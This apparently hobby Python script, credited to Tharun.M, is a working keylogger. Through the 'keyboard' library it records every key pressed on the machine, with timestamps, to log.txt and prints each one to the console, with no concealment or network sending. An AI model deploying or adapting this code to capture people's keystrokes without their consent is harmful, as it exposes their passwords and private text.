#Project By Tharun.M
import keyboard
import datetime

log_file = 'log.txt'

def on_key_press(event):
    current_time = datetime.datetime.now()
    with open(log_file, 'a') as f:
        f.write('{}->{}\n'.format(current_time,event.name))
        print('{}->{}\n'.format(current_time,event.name))

keyboard.on_press(on_key_press)

keyboard.wait()
